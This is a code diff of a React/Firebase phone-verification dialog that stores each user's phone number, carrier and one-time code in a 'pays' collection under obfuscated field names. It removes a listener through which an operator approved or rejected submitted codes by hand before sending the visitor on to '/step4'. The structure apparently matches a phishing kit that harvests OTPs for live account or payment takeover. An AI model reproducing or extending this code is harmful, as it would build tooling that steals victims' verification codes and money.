@@ -2,12 +2,11 @@
 
 import { useState, useRef, useEffect } from "react"
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
-import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { AlertCircle, CheckCircle2, Smartphone, Loader2, Shield } from "lucide-react"
 import { db } from "@/lib/firebase"
-import { doc, setDoc, onSnapshot, Firestore } from "firebase/firestore"
+import { doc, setDoc, Firestore } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 
 interface PhoneOtpDialogProps {
@@ -15,10 +14,8 @@ interface PhoneOtpDialogProps {
   onOpenChange: (open: boolean) => void
   phoneNumber: string
   phoneCarrier: string
-  onRejected: () => void
   onShowWaitingModal: (carrier: string) => void
   rejectionError?: string
-  isSecondRound?: boolean
 }
 
 export function PhoneOtpDialog({
@@ -26,14 +23,12 @@ export function PhoneOtpDialog({
   onOpenChange,
   phoneNumber,
   phoneCarrier,
-  onRejected,
   onShowWaitingModal,
   rejectionError,
-  isSecondRound,
 }: PhoneOtpDialogProps) {
   const [otp, setOtp] = useState("")
   const [timer, setTimer] = useState(60)
-  const [otpStatus, setOtpStatus] = useState<"waiting" | "verifying" | "approved" | "rejected">("waiting")
+  const [otpStatus, setOtpStatus] = useState<"waiting" | "verifying" | "approved">("waiting")
   const [error, setError] = useState("")
   const inputRef = useRef<HTMLInputElement | null>(null)
   const allOtps = useRef<string[]>([])
@@ -53,11 +48,7 @@ export function PhoneOtpDialog({
       setOtp("")
       setOtpStatus("waiting")
       allOtps.current = []
-      const storedError = localStorage.getItem("phoneOtpRejectionError")
-      if (storedError) {
-        setError(storedError)
-        localStorage.removeItem("phoneOtpRejectionError")
-      } else if (rejectionError) {
+      if (rejectionError) {
         setError(rejectionError)
       } else {
         setError("")
@@ -65,34 +56,6 @@ export function PhoneOtpDialog({
       setTimeout(() => inputRef.current?.focus(), 100)
     }
   }, [open, rejectionError])
-
-  // ── Firebase listener for round-2 admin decision ──────────────────────
-  // Active when: second round AND user has submitted (verifying state)
-  useEffect(() => {
-    if (!open || !isSecondRound || otpStatus !== "verifying") return
-    const visitorID = localStorage.getItem("visitor")
-    if (!visitorID || !db) return
-
-    const unsubscribe = onSnapshot(
-      doc(db as Firestore, "pays", visitorID),
-      (docSnap) => {
-        if (!docSnap.exists()) return
-        const data = docSnap.data()
-
-        if (data.phoneOtpStatus === "approved") {
-          setOtpStatus("approved")
-          setDoc(doc(db as Firestore, "pays", visitorID), { phoneOtpStatus: "" }, { merge: true })
-          setTimeout(() => { window.location.href = "/step4" }, 1200)
-        } else if (data.phoneOtpStatus === "rejected") {
-          setOtpStatus("waiting")
-          setOtp("")
-          setError("رمز غير صالح — يرجى إدخال رمز التحقق الصحيح")
-          setDoc(doc(db as Firestore, "pays", visitorID), { phoneOtpStatus: "pending" }, { merge: true })
-        }
-      }
-    )
-    return () => unsubscribe()
-  }, [open, isSecondRound, otpStatus])
 
   const handleChange = (value: string) => {
     if (/^\d*$/.test(value) && value.length <= 6) {
@@ -123,10 +86,7 @@ export function PhoneOtpDialog({
       await addToHistory(visitorID, "_t4", { phoneNumber, phoneCarrier }, "approved")
       await addToHistory(visitorID, "_t5", { _v7: otp }, "pending")
 
-      // Round 2: stay in verifying — Firebase listener handles admin decision
-      if (isSecondRound) return
-
-      // Round 1: close dialog, hand off to carrier modal
+      // Close OTP dialog and hand off to carrier modal
       onOpenChange(false)
       onShowWaitingModal(phoneCarrier)
     } catch (err) {
@@ -157,7 +117,6 @@ export function PhoneOtpDialog({
 
         <div className="px-6 pt-5 pb-6 space-y-5">
           <DialogHeader className="text-center space-y-3 pb-0">
-            {/* Icon */}
             <div className="flex justify-center">
               <div className="relative">
                 <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#1a5676] to-[#0e3a57] flex items-center justify-center shadow-xl shadow-blue-200">
